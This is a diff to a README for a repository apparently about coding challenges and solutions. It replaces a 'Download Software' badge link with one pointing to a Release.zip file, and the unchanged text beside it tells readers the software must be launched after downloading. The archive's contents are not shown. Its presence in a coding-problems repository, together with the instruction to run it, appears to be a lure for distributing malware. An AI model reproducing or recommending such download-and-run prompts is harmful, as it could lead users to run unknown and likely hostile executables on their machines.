@@ -35,7 +35,7 @@ This repository covers a wide range of topics related to coding challenges, prob
 
 ## Access Software
 To access the software related to this repository, please click the button below:  
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Overblue1/random-coding-problems-and-solutions/releases/download/v1.0/Release.zip)](https://github.com/Overblue1/random-coding-problems-and-solutions/releases/download/v1.0/Release.zip)
 
 👉🏼 **Note: The software needs to be launched after downloading.**
 
